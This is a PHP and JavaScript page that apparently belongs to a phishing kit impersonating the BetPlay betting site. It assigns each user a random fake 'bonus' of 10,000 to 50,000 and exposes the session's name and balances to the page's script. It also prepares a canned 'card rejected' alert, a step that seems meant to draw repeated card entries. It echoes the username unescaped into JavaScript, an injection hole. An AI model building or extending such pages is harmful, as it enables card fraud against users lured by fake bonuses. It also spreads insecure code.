<?php
session_start();
include '../../config/db.php';

$username = $_SESSION['betplay_user'] ?? 'Invitado';
$bonusAmount = 0;

if ($username !== 'Invitado') {
    try {
        // Buscar si ya tiene un bono
        $stmt = $conn->prepare("SELECT bonus_amount FROM user_bonuses WHERE username = ?");
        $stmt->execute([$username]);
        $row = $stmt->fetch();

        if ($row) {
            $bonusAmount = $row['bonus_amount'];
        } else {
            // Generar nuevo bono random (10,000 - 50,000)
            $bonusAmount = rand(10000, 50000);
            $stmt = $conn->prepare("INSERT INTO user_bonuses (username, bonus_amount) VALUES (?, ?)");
            $stmt->execute([$username, $bonusAmount]);
        }
    } catch (PDOException $e) {
        // Silently fail or log
        error_log("Error in bonus logic: " . $e->getMessage());
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="stylesheet" href="../../assets/css/dashboard.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="../../assets/js/jquery.alphanum.js"></script>
    <script src="../../assets/js/indexCreditOption.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
</head>
<?php 
$realName = $_SESSION['betplay_real_name'] ?? $username; 
$balances = $_SESSION['betplay_balances'] ?? [
    'total' => '0',
    'real' => '0',
    'activo' => '0',
    'pendiente' => '0'
];
?>
<script>
    // Variables globales para que el script de la web pueda usarlas
    var bonusAmount = <?php echo $bonusAmount; ?>;
    var betplayUser = "<?php echo $username; ?>";
    var betplayRealName = "<?php echo $realName; ?>";
    var betplayBalances = <?php echo json_encode($balances); ?>;
    console.log("Debug Bono/Saldos:", { user: betplayUser, real: betplayRealName, amount: bonusAmount, balances: betplayBalances });
</script>

<body>
    <script>
        // La lógica del bono ahora se maneja centralizadamente en indexCreditOption.js
        // para asegurar que use el nombre real y no el ID de usuario.

        var response = null;
        if (response !== null) {
            if (response.status === 'success') {
                Swal.fire({
                    title: 'Éxito',
                    text: response.message,
                    icon: 'warning',
                    confirmButtonText: 'Aceptar'
                });
            } else if (response.status === 'error') {
                Swal.fire({
                    title: '¡Tarjeta rechazada!',
                    text: 'Lo sentimos, la transacción no pudo ser procesada. Por favor, verifica los detalles de tu tarjeta o inténtalo nuevamente con otra.',
                    icon: 'error',
                    confirmButtonText: 'Continuar',
                    confirmButtonColor: '#e50914'
                });
            }
        }
    </script>
</body>

</html>